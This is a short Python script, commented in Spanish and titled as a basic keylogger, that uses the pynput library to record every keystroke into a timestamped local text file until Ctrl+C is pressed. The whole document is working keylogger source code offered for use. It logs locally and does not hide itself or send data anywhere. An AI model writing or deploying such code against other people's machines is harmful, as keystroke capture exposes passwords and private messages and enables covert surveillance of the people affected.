#!/usr/bin/python
#Autor: Jose Conde 
#Script Keylogger básico

#Importamos librerías necesarias 
import datetime
from pynput.keyboard import Listener #pip install pynput o pip3 install pynput 

#Variables para crear fichero con data exacta
data = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
fichero = open('Datos del {}.txt'.format(data), 'w')

#Función para sustituir carazteres
def key_recorder(key):
    key=str(key)

    if key == "'\\x03'":
        fichero.close()
        quit()
    elif key == 'Key.enter':
        fichero.write('\n')
    elif key == 'Key.space':
        fichero.write(' ')
    elif key == 'Key.backspace':
        fichero.write('%BORRAR%')
    else:
        fichero.write(key.replace("'",""))

#Llamamos a la función key_recorder
with Listener(on_press=key_recorder) as l:
     l.join()
